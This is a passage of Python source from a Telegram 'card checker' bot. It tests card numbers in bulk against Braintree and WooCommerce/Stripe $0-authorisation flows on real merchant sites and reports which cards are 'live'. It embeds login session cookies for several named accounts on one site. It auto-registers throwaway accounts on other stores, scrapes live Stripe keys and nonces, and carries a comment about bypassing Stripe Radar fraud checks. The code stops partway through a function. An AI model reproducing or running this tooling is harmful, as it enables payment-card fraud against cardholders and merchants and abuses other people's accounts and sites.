                icon_line  = "╔══════════════════════════╗\n║  ❌  DEAD  —  DECLINED   ║\n╚══════════════════════════╝"
            else:
                result_bar = "⚠️ ─── E R R O R ─── ⚠️"
                icon_line  = "╔══════════════════════════╗\n║  🔴  ERROR  —  SKIPPED   ║\n╚══════════════════════════╝"
            out = (
                f"<b>{result_bar}\n"
                f"{icon_line}\n"
                f"│\n"
                f"│ 💳 <code>{card}</code>\n"
                f"│\n"
                f"│ 🏦 BIN: {bin_num}  ·  {bin_info}\n"
                f"│ 🏛️ Bank: {bank}\n"
                f"│ 🌍 Country: {country} {country_code}\n"
                f"│\n"
                f"│ 🎯 Gate: Braintree $0 Auth\n"
                f"│ 💬 Msg: {m[:80]}\n"
                f"│ ⏱️ Time: {elapsed}s\n"
                f"└──────────────────────────\n"
                f"       ⌤ Bot by @yadistan</b>"
            )
            bot.edit_message_text(out, message.chat.id, msg.message_id, parse_mode='HTML')
            return

        # ── Bulk ──────────────────────────────────────────────────────────
        total   = len(cards)
        approved = dead = err = checked = 0
        results_lines = []
        hits = []

        stop_kb = types.InlineKeyboardMarkup()
        stop_kb.add(types.InlineKeyboardButton(text="🛑 Stop", callback_data='stop'))
        try:
            stopuser[f'{id}']['status'] = 'start'
        except:
            stopuser[f'{id}'] = {'status': 'start'}

        log_command(message, query_type='gateway', gateway='b3_auth')
        msg = bot.reply_to(message,
            f"<b>🟢 Braintree $0 Auth [bandc]\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"📋 Total: {total} cards\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"⏳ Starting...</b>",
            reply_markup=stop_kb, parse_mode='HTML')

        def build_b3_msg(status_text="⏳ Checking..."):
            if "DONE" in status_text:
                top = "✨ ✦ ─── B 3   D O N E ─── ✦ ✨"
            elif "STOP" in status_text:
                top = "🛑 ─── B 3   S T O P P E D ─── 🛑"
            else:
                top = "✨ ✦ ─── B 3   C H E C K E R ─── ✦ ✨"
            header = (
                f"<b>{top}\n"
                f"╔══════════════════════════╗\n"
                f"║  🟢  Braintree $0 Auth  ║\n"
                f"╚══════════════════════════╝\n"
                f"│\n"
                f"│ 📋 {checked}/{total} checked   {status_text}\n"
                f"│ ✅ Live: {approved}   ❌ Dead: {dead}   🔴 Err: {err}\n"
                f"└──────────────────────────\n"
            )
            body = "\n".join(results_lines[-8:])
            footer_hits = ""
            if hits:
                hits_lines = "".join(
                    f"\n╔══ ✅ HIT ══╗\n"
                    f"│ <code>{cc}</code>\n"
                    f"│ 💬 {res.get('message','')[:60]}\n"
                    f"│ ⏱️ {res.get('elapsed',0):.2f}s\n"
                    f"└────────────\n"
                    for cc, res in hits[-5:]
                )
                footer_hits = f"\n🎯 <b>HITS ({len(hits)})</b>" + hits_lines
            full = header + body + footer_hits + "\n✨ ✦ ─────────────── ✦ ✨\n       ⌤ Bot by @yadistan</b>"
            if len(full) > 4000:
                full = header + "\n".join(results_lines[-5:]) + footer_hits + "\n       ⌤ Bot by @yadistan</b>"
            return full

        for cc in cards:
            if stopuser.get(f'{id}', {}).get('status') == 'stop':
                try:
                    bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                          text=build_b3_msg("🛑 STOPPED"), parse_mode='HTML')
                except: pass
                return

            result  = _b3_call(cc)
            checked += 1
            s       = result.get("status", "").lower()
            m_short = result.get("message", "")[:50]
            log_card_check(id, cc, 'b3_auth', result.get('message','')[:80])

            if s == "approved":
                em, word = "✅", "Approved"
                approved += 1
                hits.append((cc, result))
            elif s == "error":
                em, word = "🔴", "Error"
                err += 1
            else:
                em, word = "❌", "Dead"
                dead += 1

            results_lines.append(f"{em} <b>{word}</b>  ·  {m_short}\n    └ <code>{cc}</code>")

            if checked % 3 == 0 or checked == total:
                try:
                    bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                          text=build_b3_msg(), parse_mode='HTML',
                                          reply_markup=stop_kb)
                    time.sleep(0.5)
                except Exception:
                    time.sleep(1)

        try:
            bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                  text=build_b3_msg("✅ DONE"), parse_mode='HTML')
        except: pass

    threading.Thread(target=my_function).start()


# ================== /wcs — WooCommerce Stripe Auth ($0 setup intent) ==================

# ── WCS ASSOC — associationsmanagement.com pre-loaded accounts (checker_1775646397101) ──
_WCS_ASSOC_HEADERS = {
    'authority': 'associationsmanagement.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'accept-language': 'en-US,en;q=0.9',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}

_WCS_ASSOC_ACCOUNTS = [
    {
        'name': 'Xray Xlea',
        'cookies': {
            '_ga': 'GA1.2.493930677.1768140612',
            '__stripe_mid': '66285028-f520-443b-9655-daf7134b8b855e5f16',
            'wordpress_logged_in_9f53720c758e9816a2dcc8ca08e321a9': 'xrayxlea%7C1769350388%7CxGcUPPOJgEHPSWiTK6F9YZpA6v4AgHki1B2Hxp0Zah5%7C3b8f3e6911e25ea6cccc48a4a0be35ed25e0479c9e90ccd2f16aa41cac04277d',
            'wfwaf-authcookie-69aad1faf32f3793e60643cdfdc85e58': '7670%7Cother%7Cread%7Cb723e85c048d2147e793e6640d861ae4f4fddd513abc1315f99355cf7d2bc455',
            '__cf_bm': 'rd1MFUeDPNtBzTZMChisPSRIJpZKLlo5dgif0o.e_Xw-1769258154-1.0.1.1-zhaKFI8L0JrFcuTzj.N9OkQvBuz6HvNmFFKCSqfn_gE2EF3GD65KuZoLGPuEhRyVwkKakMr_mcjUehEY1mO9Kb9PKq1x5XN41eXwXQavNyk',
            '__stripe_sid': '4f84200c-3b60-4204-bbe8-adc3286adebca426c8',
        }
    },
    {
        'name': 'Yasin Akbulut',
        'cookies': {
            '__cf_bm': 'zMehglRiFuX3lzj170gpYo3waDHipSMK0DXxfB63wlk-1769340288-1.0.1.1-ppt5LELQNDnJzFl1hN13LWwuQx5ZFdMS9b0SP4A3j7kasxaqEBMgSJ3vu9AbzyFOlbCozpAr.hE.g3xFpU_juaLp1heupyxmSrmte1Gn7g0',
            'wordpress_logged_in_9f53720c758e9816a2dcc8ca08e321a9': 'akbulutyasin836%7C1770549977%7CwdF5vz1qFXPSxofozNx9OwxFdmIoSdQKxaHlkOkjL2o%7C4d5f40c1bf01e0ccd6a59fdf08eb8f5aeb609c05d4d19fe41419a82433ffc1fa',
            '__stripe_mid': '2d2e501a-542d-4635-98ec-e9b2ebe26b4c9ac02a',
            '__stripe_sid': 'b2c6855b-7d29-4675-8fe4-b5c4797045132b8dea',
            'wfwaf-authcookie-69aad1faf32f3793e60643cdfdc85e58': '8214%7Cother%7Cread%7Cde5fd05c6afc735d5df323de21ff23f598bb5e1893cb9a7de451b7a8d50dc782',
        }
    },
    {
        'name': 'Mehmet Demir',
        'cookies': {
            '__cf_bm': 'zMehglRiFuX3lzj170gpYo3waDHipSMK0DXxfB63wlk-1769340288-1.0.1.1-ppt5LELQNDnJzFl1hN13LWwuQx5ZFdMS9b0SP4A3j7kasxaqEBMgSJ3vu9AbzyFOlbCozpAr.hE.g3xFpU_juaLp1heupyxmSrmte1Gn7g0',
            'wordpress_logged_in_9f53720c758e9816a2dcc8ca08e321a9': 'akbulutyasin836%7C1770549977%7CwdF5vz1qFXPSxofozNx9OwxFdmIoSdQKxaHlkOkjL2o%7C4d5f40c1bf01e0ccd6a59fdf08eb8f5aeb609c05d4d19fe41419a82433ffc1fa',
            '__stripe_mid': '2d2e501a-542d-4635-98ec-e9b2ebe26b4c9ac02a',
            '__stripe_sid': 'b2c6855b-7d29-4675-8fe4-b5c4797045132b8dea',
            'sbjs_migrations': '1418474375998%3D1',
        }
    },
    {
        'name': 'Ahmet Aksoy',
        'cookies': {
            '__cf_bm': 'aidh4Te7pipYMK.tLzhoGhXGelOgYCnYQJ525DEIqNM-1769341631-1.0.1.1-HSRHKAbOct2k1bbWIIdIN7b5fzWFydAtRqz2W0pAdRXrbVusNthJCJvU5fc7d3RkZEOZ5ZXZghJ4J2jmYzIcdJGDbb90txn4HPgSKJ6neA8',
            '_ga': 'GA1.2.1596026899.1769341671',
            '_gid': 'GA1.2.776441.1769341671',
            '__stripe_mid': '1b0100cd-503c-4665-b43b-3f5eb8b4edcdaae8bd',
            '__stripe_sid': '0f1ce17f-f7a9-4d26-bd37-52d402d30d1a8716bf',
            'wordpress_logged_in_9f53720c758e9816a2dcc8ca08e321a9': 'ahmetaksoy2345%7C1770551236%7CGF3svY4oh1UiTMXJ9iUXXuXtimHSG6PHiW0Sm5wrDbt%7Ce810ede4e1743cd73dc8dacdd56598ecf4ceaa383052d9b50d1bbd6c02da7237',
            'wfwaf-authcookie-69aad1faf32f3793e60643cdfdc85e58': '8216%7Cother%7Cread%7C70f37e1a77141c049acd75715a8d1aef6d47b285656c907c79392a55e787d97e',
        }
    },
    {
        'name': 'Dlallah',
        'cookies': {
            '__cf_bm': 'nwW.aCdcJXW8SAKZYpmEuqU6gCsNM1ibgP9mNKqXuYw-1769341811-1.0.1.1-hkeF4QihuQfbJD7DRqQcILcMycgxTqxxHcqwsU6oR8WsdViGcVMbX0CHqmx76N8wUEuIQwLFooNTm2gjGrRCKlURh4vf1ghD3gkz18KjyWg',
            '__stripe_mid': 'c7368749-b4fc-4876-bb97-bc07cc8a36b5851848',
            '__stripe_sid': 'b9d4dfb2-bba4-4ee6-9c72-8acf6acfe138efd65d',
            '_ga': 'GA1.2.1162515809.1769341851',
            'wordpress_logged_in_9f53720c758e9816a2dcc8ca08e321a9': 'dlallah%7C1770551422%7CiMfIpOcXTEo2Y9rmVMf3Mpf0kpkC4An81IgT0ZfMLff%7C01fbc5549954aa84d4f1b6c62bc44ebe65df58be0b82014d1b246c220d361231',
            'wfwaf-authcookie-69aad1faf32f3793e60643cdfdc85e58': '8217%7Cother%7Cread%7C24531823e5d32b0ad918bef860997fced3f0b92cce7ba200e3a753e050b546d3',
        }
    },
]

def _wcs_assoc_call(card: str, proxy_dict: dict = None, mode: str = "auth") -> dict:
    """$0 auth via associationsmanagement.com — uses pre-loaded account pool (cloudscraper).
    mode: 'auth' (default) → full WCS auth check
          'vbv'            → returns 3DS/VBV support status from Stripe PM
    """
    t0 = time.time()
    try:
        parts = card.strip().split('|')
        if len(parts) < 4:
            return {"status": "error", "message": "Invalid card format", "elapsed": 0}
        n, mm, yy, cvc = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
        if len(yy) == 4:
            yy_full = yy
        else:
            yy_full = "20" + yy[-2:]

        acc = random.choice(_WCS_ASSOC_ACCOUNTS)

        scraper = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'android', 'mobile': True})
        if proxy_dict:
            scraper.proxies.update(proxy_dict)
        scraper.cookies.update(acc['cookies'])
        scraper.headers.update(_WCS_ASSOC_HEADERS)

        # Step 1 — load add-payment-method page
        r_page = scraper.get("https://associationsmanagement.com/my-account/add-payment-method/", timeout=25)
        pk_m = re.search(r'pk_live_[a-zA-Z0-9]+', r_page.text)
        nonce_m = re.search(r'"createAndConfirmSetupIntentNonce":"([a-z0-9]+)"', r_page.text)
        if not pk_m or not nonce_m:
            return {"status": "error", "message": "pk_live/nonce not found — account cookies may be expired", "elapsed": round(time.time()-t0, 2)}

        pk_live  = pk_m.group(0)
        addnonce = nonce_m.group(1)
        time.sleep(random.uniform(1.5, 2.5))

        # Step 2 — create Stripe PM
        stripe_hd = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': _WCS_ASSOC_HEADERS['user-agent'],
        }
        stripe_payload = (
            f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy_full}&card[exp_month]={mm}'
            f'&billing_details[name]={acc["name"].replace(" ", "+")}'
            f'&billing_details[address][postal_code]=10001'
            f'&key={pk_live}'
            f'&muid={acc["cookies"].get("__stripe_mid", str(uuid.uuid4()))}'
            f'&sid={acc["cookies"].get("__stripe_sid", str(uuid.uuid4()))}'
            f'&guid={str(uuid.uuid4())}'
            f'&payment_user_agent=stripe.js%2F8f77e26090%3B+stripe-js-v3%2F8f77e26090%3B+checkout'
            f'&time_on_page={random.randint(90000, 150000)}'
        )
        r_stripe = scraper.post('https://api.stripe.com/v1/payment_methods', headers=stripe_hd, data=stripe_payload).json()

        if 'id' not in r_stripe:
            stripe_err  = r_stripe.get('error', {})
            err_msg     = stripe_err.get('message', 'Radar Security Block')
            err_code    = stripe_err.get('code', '')
            err_type    = stripe_err.get('type', '')
            # Stripe-side / gateway restriction → trigger fallback
            _gw_keywords = (
                'unsupported', 'integration surface', 'publishable key',
                'radar', 'dashboard', 'tokenization', 'api_connection',
                'rate_limit', 'api_error', 'authentication_error',
            )
            _is_gw_error = (
                err_type in ('api_connection_error', 'api_error', 'authentication_error', 'rate_limit_error')
                or any(kw in err_msg.lower() for kw in _gw_keywords)
            )
            if _is_gw_error:
                return {"status": "error", "message": f"Gateway restricted: {err_msg[:60]}", "elapsed": round(time.time()-t0, 2)}
            return {"status": "dead", "message": err_msg[:80], "elapsed": round(time.time()-t0, 2)}

        pm_id = r_stripe['id']

        # ── VBV mode: return 3DS info from Stripe PM response ────────────
        if mode == "vbv":
            elapsed = round(time.time() - t0, 2)
            vbv_supported = r_stripe.get('card', {}).get('three_d_secure_usage', {}).get('supported', None)
            card_brand    = r_stripe.get('card', {}).get('brand', 'unknown').upper()
            card_country  = r_stripe.get('card', {}).get('country', '')
            card_funding  = r_stripe.get('card', {}).get('funding', '').upper()
            if vbv_supported is True:
                vbv_label = "✅ VBV ON (3DS Supported)"
                vbv_status = "vbv_on"
            elif vbv_supported is False:
                vbv_label = "❌ VBV OFF (No 3DS)"
                vbv_status = "vbv_off"
            else:
                vbv_label = "⚠️ VBV Unknown"
                vbv_status = "vbv_unknown"
            return {
                "status": "vbv",
                "vbv_status": vbv_status,
                "message": vbv_label,
                "brand": card_brand,
                "country": card_country,
                "funding": card_funding,
                "pm_id": pm_id,
                "elapsed": elapsed,
            }

        # Step 3 — WooCommerce AJAX confirm setup intent
        ajax_r = scraper.post(
            'https://associationsmanagement.com/wp-admin/admin-ajax.php',
            data={
                'action': 'wc_stripe_create_and_confirm_setup_intent',
                'wc-stripe-payment-method': pm_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': addnonce,
            },
            timeout=20
        )
        elapsed = round(time.time() - t0, 2)
        r_text  = ajax_r.text.strip()
        r_lower = r_text.lower()

        # ── Gateway / session failure → trigger fallback ──────────────────────
        _succ_false = '"success":false' in r_lower or '"success": false' in r_lower
        _has_detail = '"message"' in r_lower or '"data"' in r_lower
        _gateway_fail = (
            r_text in ('0', '-1', '', 'false', 'null')
            or (_succ_false and not _has_detail)
            or (ajax_r.status_code in (403, 401, 500, 503))
        )
        if _gateway_fail:
            return {"status": "error", "message": "AJAX session/nonce failure", "elapsed": elapsed}

        # ── Parse JSON if possible ─────────────────────────────────────────────
        _ajax_json = {}
        try:
            _ajax_json = ajax_r.json()
        except Exception:
            pass

        # ── Approved patterns ─────────────────────────────────────────────────
        if ('"success":true' in r_lower or '"success": true' in r_lower
                or _ajax_json.get('success') is True
                or 'insufficient_funds' in r_lower):
            return {"status": "approved", "message": "Approved ✅ ($0 Auth)", "elapsed": elapsed}
        if 'incorrect_cvc' in r_lower:
            return {"status": "approved", "message": "CVC Matched ✅ (Auth)", "elapsed": elapsed}
        if 'requires_action' in r_lower or '3d_secure' in r_lower or 'otp' in r_lower:
            return {"status": "approved", "message": "OTP/3DS Required", "elapsed": elapsed}

        # ── Decline reason ────────────────────────────────────────────────────
        # Try JSON data.message or data first
        _data = _ajax_json.get('data', {})
        if isinstance(_data, dict):
            reason = _data.get('message', '') or _data.get('error', '')
        elif isinstance(_data, str) and len(_data) > 4:
            reason = _data
        else:
            reason = ''
        # Fallback to regex
        if not reason:
            reason_m = re.search(r'"message"\s*:\s*"([^"]{4,120})"', ajax_r.text)
            reason = reason_m.group(1).strip() if reason_m else ''
        # If still no reason and not a clear decline, treat as gateway error
        if not reason:
            if '"success":false' in r_lower:
                return {"status": "error", "message": "Auth failed (no reason)", "elapsed": elapsed}
            return {"status": "error", "message": "AJAX unrecognized response", "elapsed": elapsed}

        return {"status": "dead", "message": reason[:80], "elapsed": elapsed}

    except Exception as e:
        return {"status": "error", "message": str(e)[:70], "elapsed": round(time.time()-t0, 2)}


def _auth_smart_check(card: str, proxy: dict = None) -> dict:
    """
    Enhanced auth with smart fallback chain:
      1. AssocMgmt primary  (2 retries with different accounts)
      2. stripe_auth_ex     (multi-WCS fallback if assoc errors)
    Returns: {status, message, gateway, elapsed}
    """
    import time as _t
    t_start = _t.time()

    # ── Layer 1: AssocMgmt (2 retries) ────────────────────────────────────
    for attempt in range(2):
        try:
            res = _wcs_assoc_call(card, proxy, mode="auth")
            if res.get("status") != "error":
                res["gateway"] = "AssocMgmt $0"
                res["layer"]   = 1
                return res
        except Exception:
            pass

    # ── Layer 2: stripe_auth_ex (multi-WCS sites) ─────────────────────────
    try:
        res_str, gw_label = stripe_auth_ex(card, proxy)
        elapsed = round(_t.time() - t_start, 2)
        rl = res_str.lower()

        if "approved" in rl and ("insufficient" in rl or "funds" in rl):
            status, msg = "approved", "Insufficient Funds 💳"
        elif "approved" in rl:
            status, msg = "approved", "Approved ✅"
        elif "otp" in rl or "3ds" in rl or "requires_action" in rl:
            status, msg = "approved", "OTP/3DS Required ⚠️"
        elif res_str.strip().upper() == "CCN":
            status, msg = "dead", "Declined (CCN)"
        else:
            status, msg = "dead", res_str[:60]

        return {"status": status, "message": msg,
                "gateway": f"WCS:{gw_label}", "layer": 2, "elapsed": elapsed}

    except Exception as e:
        elapsed = round(_t.time() - t_start, 2)
        return {"status": "error", "message": str(e)[:60],
                "gateway": "N/A", "layer": 0, "elapsed": elapsed}


# ── WCS v3 — WooCommerce Stripe SetupIntent ($0 auth) — stripev3 method ──────
def _wcs_v3_call(site: str, card: str):
    """$0 auth via WooCommerce Stripe Plugin (SetupIntent). Returns dict(status,message,elapsed)."""
    try:
        t0 = time.time()
        parts = card.strip().split("|")
        if len(parts) < 4:
            return {"status": "error", "message": "Invalid card", "elapsed": 0}
        cc_num = parts[0].strip(); cc_mon = parts[1].strip()
        cc_year = parts[2].strip(); cc_cvc = parts[3].strip()
        if len(cc_year) == 4:
            cc_year = cc_year[2:]
        site = site.rstrip("/")
        if not site.startswith("http"):
            site = "https://" + site
        UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0")
        sess = requests.Session()
        sess.headers.update({"user-agent": UA})
        # Step 1 — Register on site
        email = "".join(random.choices(string.ascii_lowercase + string.digits, k=10)) + "@gmail.com"
        reg_url = f"{site}/my-account/"
        try:
            r_reg = sess.get(reg_url, timeout=15)
            nonce = None
            m = re.search(r'name="woocommerce-register-nonce"\s+value="([^"]+)"', r_reg.text)
            if m:
                nonce = m.group(1)
            if nonce:
                sess.post(reg_url, data={"email": email, "woocommerce-register-nonce": nonce,
                                         "_wp_http_referer": "/my-account/", "register": "Register"},
                          headers={"referer": reg_url}, timeout=15)
        except Exception:
            pass
        # Step 2 — Get add-payment-method page + nonce
        pay_url = f"{site}/my-account/add-payment-method/"
        try:
            r_pay = sess.get(pay_url, timeout=15)
            page_text = r_pay.text
        except Exception as e:
            return {"status": "error", "message": f"Site unreachable: {str(e)[:40]}", "elapsed": round(time.time()-t0, 2)}
        # Extract setup nonce
        setup_nonce = None
        try:
            setup_nonce = page_text.split('"createAndConfirmSetupIntentNonce":"')[1].split('"')[0]
        except Exception:
            pass
        if not setup_nonce:
            for pat in [r'"nonce"\s*:\s*"([^"]+)"', r'wc_stripe_params.*?"nonce"\s*:\s*"([^"]+)"']:
                m = re.search(pat, page_text)
                if m:
                    setup_nonce = m.group(1); break
        if not setup_nonce:
            return {"status": "error", "message": "Nonce not found — site may not use WCS Stripe plugin", "elapsed": round(time.time()-t0, 2)}
        # Extract pk_live
        pk_live = None
        for pat in [r'"key"\s*:\s*"(pk_live_[A-Za-z0-9]+)"', r"pk_live_[A-Za-z0-9]+"]:
            m = re.search(pat, page_text)
            if m:
                pk_live = m.group(1) if '"key"' in pat else m.group(0); break
        if not pk_live:
            return {"status": "error", "message": "pk_live not found on site", "elapsed": round(time.time()-t0, 2)}
        site_host = site.replace("https://", "").replace("http://", "")
        stripe_js_id = str(uuid.uuid4())
        time_on_pg   = str(random.randint(100000, 500000))
        muid = str(uuid.uuid4()); sid_v = str(uuid.uuid4()); guid = str(uuid.uuid4())
        sh = {"accept": "application/json", "content-type": "application/x-www-form-urlencoded",
              "origin": "https://js.stripe.com", "referer": "https://js.stripe.com/", "user-agent": UA}
        # Step 3 — elements/sessions
        es_r = sess.get(
            "https://api.stripe.com/v1/elements/sessions"
            "?deferred_intent[mode]=setup&deferred_intent[currency]=usd"
            "&deferred_intent[payment_method_types][0]=card"
            "&deferred_intent[setup_future_usage]=off_session&currency=usd"
            f"&key={pk_live}&_stripe_version=2024-06-20&elements_init_source=stripe.elements"
            f"&referrer_host={site_host}&stripe_js_id={stripe_js_id}&locale=en&type=deferred_intent",
            headers=sh, timeout=15)
        config_id = es_r.json().get("config_id", "") if es_r.ok else ""
        # Step 4 — Create payment method
        pm_r = sess.post("https://api.stripe.com/v1/payment_methods", headers=sh, data={
            "type": "card", "card[number]": cc_num, "card[cvc]": cc_cvc,
            "card[exp_year]": cc_year, "card[exp_month]": cc_mon,
            "allow_redisplay": "unspecified", "billing_details[address][country]": "US",
            "pasted_fields": "number",
            "payment_user_agent": "stripe.js/668d00c08a; stripe-js-v3/668d00c08a; payment-element; deferred-intent",
            "referrer": site, "time_on_page": time_on_pg,
            "client_attribution_metadata[client_session_id]": stripe_js_id,
            "client_attribution_metadata[merchant_integration_source]": "elements",
            "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
            "client_attribution_metadata[merchant_integration_version]": "2021",
            "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
            "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
            "client_attribution_metadata[elements_session_config_id]": config_id,
            "guid": guid, "muid": muid, "sid": sid_v,
            "key": pk_live, "_stripe_version": "2024-06-20",
        }, timeout=15)
        pm_json = pm_r.json()
        if "id" not in pm_json:
            msg = pm_json.get("error", {}).get("message", "Declined at tokenization")
            return {"status": "dead", "message": msg, "elapsed": round(time.time()-t0, 2)}
        pm_id = pm_json["id"]
        # Step 5 — WooCommerce AJAX: create + confirm setup intent
        ajax_r = sess.post(f"{site}/wp-admin/admin-ajax.php", headers={
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": site, "referer": pay_url,
            "x-requested-with": "XMLHttpRequest", "user-agent": UA,
        }, data={
            "action": "wc_stripe_create_and_confirm_setup_intent",
            "wc-stripe-payment-method": pm_id,
            "wc-stripe-payment-type": "card",
            "_ajax_nonce": setup_nonce,
        }, timeout=20)
        elapsed = round(time.time() - t0, 2)
        try:
            resp = ajax_r.json()
        except Exception:
            return {"status": "dead", "message": "Non-JSON response", "elapsed": elapsed}
        data_obj = resp.get("data", {})
        status   = data_obj.get("status") if isinstance(data_obj, dict) else None
        if status == "requires_action":
            return {"status": "approved", "message": "OTP/3DS Required", "elapsed": elapsed}
        elif status in ("succeeded", "processing"):
            return {"status": "approved", "message": "Approved ($0 Auth)", "elapsed": elapsed}
        else:
            if isinstance(data_obj, dict):
                msg = (data_obj.get("error") or {}).get("message", "") or data_obj.get("message", "Declined")
            else:
                msg = str(resp)[:80]
            return {"status": "dead", "message": msg or "Declined", "elapsed": elapsed}
    except requests.exceptions.Timeout:
        return {"status": "error", "message": "Timeout", "elapsed": 0}
    except Exception as e:
        return {"status": "error", "message": str(e)[:60], "elapsed": 0}
# ─────────────────────────────────────────────────────────────────────────────

_wcs_site_cache = {}   # site_url → {email, password, session} cache for speed

def _wcs_call(site: str, card: str):
    """Stripe $0 auth via WooCommerce Payments (wcpay) on any compatible site."""
    import time, uuid, re as _re, string
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    from requests_toolbelt.multipart.encoder import MultipartEncoder

    parts = card.split('|')
    if len(parts) < 4:
        return {"status": "error", "message": "Invalid card format", "elapsed": 0}
    cn, mm, yy, cvc = parts[0].strip(), parts[1].strip(), parts[2].strip()[-2:], parts[3].strip()

    site = site.rstrip('/')
    if not site.startswith(('http://', 'https://')):
        site = 'https://' + site

    UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
    base_headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'User-Agent': UA,
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
    }

    t0 = time.time()
    try:
        # ── Step 1: Register or reuse cached account ──────────────────────
        sess = requests.Session()
        retry = Retry(total=3, backoff_factor=0.5, raise_on_status=False, allowed_methods=False)
        sess.mount('https://', HTTPAdapter(max_retries=retry))
        sess.headers.update(base_headers)

        cached = _wcs_site_cache.get(site)
        if cached:
            email, password = cached['email'], cached['password']
            # Re-login with cached credentials
            r = sess.get(f'{site}/my-account/', timeout=15)
            lnonce = _re.search(r'name="woocommerce-login-nonce" value="(.*?)"', r.text)
            if lnonce:
                sess.post(f'{site}/my-account/', headers={
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': site, 'referer': f'{site}/my-account/',
                }, data={
                    'username': email, 'password': password,
                    'woocommerce-login-nonce': lnonce.group(1),
                    '_wp_http_referer': '/my-account/', 'login': 'Log in',
                }, timeout=15)
        else:
            # Register fresh account
            r = sess.get(f'{site}/my-account/', timeout=15)

            # Quick site type detection
            if 'myshopify.com' in site or 'cdn.shopify.com' in r.text or 'Shopify.theme' in r.text:
                return {"status": "error", "message": "Shopify site detected — /wcs needs WooCommerce site, use /sp for Shopify", "elapsed": round(time.time()-t0,2)}
            if 'woocommerce' not in r.text.lower() and 'wp-content' not in r.text.lower():
                return {"status": "error", "message": "Not a WooCommerce site — /wcs requires WCPay enabled WordPress store", "elapsed": round(time.time()-t0,2)}

            rnonce = (
                _re.search(r'name="woocommerce-register-nonce" value="([^"]+)"', r.text) or
                _re.search(r'"woocommerce-register-nonce"\s*value="([^"]+)"', r.text) or
                _re.search(r'woocommerce-register-nonce["\s]+value["\s=]+([a-f0-9]{10,})', r.text)
            )
            if not rnonce:
                return {"status": "error", "message": "Register nonce not found — site may have registration disabled", "elapsed": round(time.time()-t0,2)}
            email    = ''.join(random.choices(string.ascii_lowercase, k=8)) + str(random.randint(10,99)) + '@gmail.com'
            password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
            r2 = sess.post(f'{site}/my-account/', headers={
                'content-type': 'application/x-www-form-urlencoded',
                'origin': site, 'referer': f'{site}/my-account/',
                'Cache-Control': 'no-cache',
            }, data={
                'email': email, 'password': password,
                'woocommerce-register-nonce': rnonce.group(1),
                '_wp_http_referer': '/my-account/', 'register': 'Register',
            }, timeout=20)
            if 'woocommerce-error' in r2.text and 'already' not in r2.text.lower():
                err_m = _re.search(r'<li>(.*?)</li>', r2.text[r2.text.find('woocommerce-error'):])
                emsg  = err_m.group(1)[:80] if err_m else 'Registration failed'
                from bs4 import BeautifulSoup
                emsg  = BeautifulSoup(emsg, 'html.parser').get_text()[:80]
                return {"status": "error", "message": emsg, "elapsed": round(time.time()-t0,2)}
            _wcs_site_cache[site] = {'email': email, 'password': password}

        # ── Step 2: Get Stripe keys from add-payment-method page ──────────
        r = sess.get(f'{site}/my-account/add-payment-method/', timeout=15)
        html = r.text

        # Multi-pattern PK extraction (4 patterns — DLX improved)
        pks = None
        for _pk_pat in [
            r'["\']publishableKey["\']\s*:\s*["\']?(pk_(?:live|test)_[a-zA-Z0-9]+)',
            r'(pk_live_[a-zA-Z0-9]{24,})',
            r'(pk_test_[a-zA-Z0-9]{24,})',
            r'(?:var|let|const)\s+\w*key\w*\s*[=:]\s*["\']?(pk_(?:live|test)_[a-zA-Z0-9]+)',
        ]:
            _m = _re.search(_pk_pat, html)
            if _m:
                pks = _m.group(1)
                break

        # Multi-pattern nonce extraction (5 patterns)
        nonce = None
        for _nc_pat in [
            r'"createSetupIntentNonce"\s*:\s*"([a-f0-9]+)"',
            r'"createAndConfirmSetupIntentNonce"\s*:\s*"([a-f0-9]+)"',
            r'wc-stripe-create-setup-intent-nonce["\'][^>]+value=["\']([a-z0-9]+)["\']',
            r'stripe_nonce["\']?\s*[:=]\s*["\']([a-z0-9]+)["\']',
            r'"nonce"\s*:\s*"([a-f0-9]{8,})"',
        ]:
            _m = _re.search(_nc_pat, html)
            if _m:
                nonce = _m.group(1)
                break

        acct_m = _re.search(r'["\']accountId["\']\s*:\s*["\']?(acct_[a-zA-Z0-9]+)', html)
        acct   = acct_m.group(1) if acct_m else ''

        if not pks or not nonce:
            return {"status": "error", "message": "WCPay Stripe keys not found — site may not use WooCommerce Payments", "elapsed": round(time.time()-t0,2)}

        # ── Step 3: Tokenize card via Stripe API (DLX Radar bypass) ──────
        sess_id    = str(uuid.uuid4())
